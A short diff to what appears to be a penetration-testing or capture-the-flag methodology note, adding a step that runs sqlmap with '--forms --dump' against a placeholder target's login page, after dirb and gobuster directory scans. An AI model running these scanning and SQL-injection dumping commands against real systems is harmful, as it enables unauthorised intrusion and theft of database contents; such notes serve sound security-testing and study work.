@@ -18,7 +18,11 @@ $dirb http://example.com -o dirb-report.txt
 
 $gobuster -u http://example.com -x php.txt,html -w /usr/share/dirb/wordlists/big.txt dir
 
-# 3° Gain Access
+# 3° Scan SQLMap
+
+$sqlmap -u http://Target_IP/login.php --forms --dump
+
+# 4° Gain Access
 
 http://example.com/login
 
